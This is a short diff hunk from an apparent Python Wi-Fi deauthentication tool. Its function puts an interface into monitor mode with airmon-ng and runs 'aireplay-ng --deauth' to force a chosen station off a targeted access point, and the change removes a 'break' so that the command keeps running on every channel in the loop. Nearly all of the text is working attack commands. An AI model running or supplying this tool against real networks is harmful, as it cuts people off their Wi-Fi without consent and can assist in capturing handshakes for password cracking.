@@ -16,7 +16,6 @@ def deauth(BSSID, STATION, IFACE, PACKETS):
 				print(f"Deauth {STATION} from {BSSID} on channel {channel}...")
 				os.system(f"airmon-ng start {IFACE} {channel}")
 				os.system(f"aireplay-ng --deauth {PACKETS} -a {BSSID} -c {STATION} {IFACE}")
-				break
 			except:
 				print("Channel incorrect")
 
